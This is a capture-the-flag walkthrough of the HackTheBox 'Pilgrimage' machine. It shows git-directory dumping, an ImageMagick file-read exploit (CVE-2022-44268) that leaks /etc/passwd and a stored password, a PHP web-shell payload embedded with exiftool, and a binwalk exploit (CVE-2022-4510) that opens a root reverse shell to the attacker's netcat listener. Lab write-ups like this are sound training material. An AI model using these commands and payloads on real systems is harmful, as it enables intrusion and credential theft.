# HackTheBox
------------------------------------
### IP: 10.129.93.124
### Name: Pilgrimage
### Difficulty: Easy
--------------------------------------------

![Pilgrimage.png](../assets/pilgrimage_assets/Pilgrimage.png)

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.129.93.124  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-30 09:00 CDT
Warning: 10.129.93.124 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.93.124
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.33 seconds
```

Looks just like SSH and HTTP open for TCP. 

Lets add pilgrimage.htb to `/etc/hosts`.

Looking at the site we find an "online image shrinker"

pilgrimage_site.png

I've been in the habit of rescanning a target with Nmap once I've added it to my `/etc/hosts` file because occasionally you can uncover more information from HTTP, and this box was no different:

pilgrimage_nmap2.png

Nmap has found a `/.git` directory. This is definitely worth investigating.


I'll use git-dumper.py to enumerate this. https://github.com/arthaud/git-dumper/blob/master/git_dumper.py


We can use this script with:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ python ~/Tools/exploits/git_dumper.py http://pilgrimage.htb/.git/ git
```

We can run `git log` to see there has only been one, initial commit for the site.

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage/git]
└─$ git log                                          
commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -> master)
Author: emily <emily@pilgrimage.htb>
Date:   Wed Jun 7 20:11:48 2023 +1000

    Pilgrimage image shrinking service initial commit.
```

We also discover the username emily.

Using `git show` to inspect this we can see the site is using a PHP library called Bulletproof to handle the image upload:

pilgrimage_show.png

Looking for exploits surrounding Bulletproof, we find this issues page on the developer's GitHub: https://github.com/samayo/bulletproof/issues/90

The issue reads:

```
Calling this project "BULLETPROOF" and saying "with security" implies to developers that this library will handle all their image uploading security concerns. To an inexperienced developer, this is very dangerous.

This library does not provide much in terms of security for image uploading. For instance, a major security concern of managing image uploads with PHP is that the images may contain malicious code (embedded PHP).

The library may prove useful for many developers, but I suggest removing the language "with security" and also consider renaming this project.

Thanks for reading!
```

This is interesting and definitely gives us a tip for a potential attack vector.

Lets try getting some PHP coded execution via the image upload.

First I'll create an account using `test:password`

pilgrimage_register.png

Next I can head to google and find a picture of a dog to embed my PHP into:

pilgrimage_search.png

First I tried simply adding my php code as comment to the image using exiftool, but had no luck:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ mv dog.jpg dog.php.jpg             
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ exiftool -Comment='<?php system($_GET['cmd']); ?>' dog.php.jpg 
    1 image files updated
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ file dog.php.jpg
dog.php.jpg: JPEG image data, JFIF standard 1.02, resolution (DPI), density 72x72, segment length 16, comment: "<?php system($_GET[cmd]); ?>", progressive, precision 8, 5257x3505, components 3
```

After fiddling around with renaming files, inserting magic bytes into shells, etc. I went back and took a look at the php files from git.

We can see that the page is using imagemagick to shrink the files down:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage/git]
└─$ cat index.php | grep magic
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

Specifically it is using `convert` and then shrinking the file by 50% and then saving it under a new name.

Looking for imagemagick exploits I find this arbitrary file read vulnerability: https://github.com/entr0pie/CVE-2022-44268

Looks like we were on the right track with inserting PHP into an image, but rather than trying to spawn a shell, we should have been looking to exploit an LFI/ arbitrary file read vulnerability. 

Lets give the exploit a shot.

### Exploitation

First I'll grab a new random dog picture and rename it source.png.

Next I can run:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ python CVE-2022-44268.py /etc/passwd
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ file output.png 
output.png: PNG image data, 1200 x 1200, 8-bit/color RGBA, non-interlaced
```

Lets now load our output.png file for shrinking.

Once loaded and shrunk the page gives us the URL to access our file:

pilgrimage_url.png

We can then right click on our image and select 'Save Image As'.

From here the exploit directs us to use `identify` to grab the Raw Profile hex of the encoded `/etc/passwd`, but I was having install issues and rather than troubleshooting I just used exiftool to grab it:

pilgrimage_raw.png

We can then decode it using CyberChef https://gchq.github.io/CyberChef:

pilgrimage_pass

Awesome, that worked.

Looking through `/etc/hosts` we see that user emily who we identified earlier from the git commit has a bash profile. Knowing this box has SSH opepn, lets see if we can grab her id_rsa key.

We'll run:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ python CVE-2022-44268.py /home/emily/.ssh/id_rsa
```

Then upload the image, and trying to grab the hex using exiftool I see that nothing is returned. This must mean that the file doesn't exist.

Going back to the git code we can see in login.php there is a sqlite3 DB in use, and passwords are verified against the file `/var/db/pilgrimage`. 

Lets try accessing that with our exploit.

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ python CVE-2022-44268.py /var/db/pilgrimage
```

Once we've loaded the file and downloaded the shrunken file, we find a bunch of null hex:

pilgrimage_raw2.png

However going through and pasting the hex we do find back in cyberchef, we find what appears to be emily's password: `emily:abigchonkyboi123`

pilgrimage_chef.png


We can use this to SSH in as user emily:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ whoami && hostname
emily
pilgrimage
```
Where we can grab the user.txt flag:

pilgrimage_user_flag.png

### Privilige Escalation

Looking in emily's home directory, we find binwalk in her `.config` folder:

```
emily@pilgrimage:~$ cd .config
emily@pilgrimage:~/.config$ ls -la
total 12
drwxr-xr-x 3 emily emily 4096 Jun  8  2023 .
drwxr-xr-x 5 emily emily 4096 Jul  2 02:39 ..
drwxr-xr-x 6 emily emily 4096 Jun  8  2023 binwalk
emily@pilgrimage:~/.config$ cd binwalk
emily@pilgrimage:~/.config/binwalk$ ls -la
total 24
drwxr-xr-x 6 emily emily 4096 Jun  8  2023 .
drwxr-xr-x 3 emily emily 4096 Jun  8  2023 ..
drwxr-xr-x 2 emily emily 4096 Jun  8  2023 config
drwxr-xr-x 2 emily emily 4096 Jun  8  2023 magic
drwxr-xr-x 2 emily emily 4096 Jun  8  2023 modules
drwxr-xr-x 2 emily emily 4096 Jun  8  2023 plugins
```

That's a bit odd.

We can run binwalk to grab the version number:

```
emily@pilgrimage:~/.config/binwalk$ /usr/local/bin/binwalk 

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
```

Also of interest on the target is a script called malwarescan.sh:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
    filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
    binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
        if [[ "$binout" == *"$banned"* ]]; then
            /usr/bin/rm "$filename"
            break
        fi
    done
done
```

This file is owned and executed by root and using binwalk scans the `/shrunk` directory looking for new files.


Looking up exploits for binwalk 2.3.2 we find a PoC we can use to string these findings together to escalate to root. https://github.com/adhikara13/CVE-2022-4510-WalkingPath


First, lets copy the Python exploit to the target, as well as a random .png image file.

Next we can run: 

```
emily@pilgrimage:/tmp$ python3 binwalk_exploit.py reverse dog.png 10.10.14.216 443
```

Which creates a file called binwalk_exploit.png which contains our reverse shell.

Setting up a netcat listener and copying the file to `/var/www/pilgrimage.htb/shrunk/` we catch a shell back as root:

```
┌──(ryan㉿kali)-[~/HTB/Pilgrimage]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.216] from (UNKNOWN) [10.129.96.154] 58756
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
hostname
pilgrimage
python3 -c 'import pty;pty.spawn("/bin/bash")'

root@pilgrimage:~/quarantine#
```

Where we can grab the final flag:

pilgrimage_root_flag.png

Thanks for following along!

-Ryan

------------------------------------------



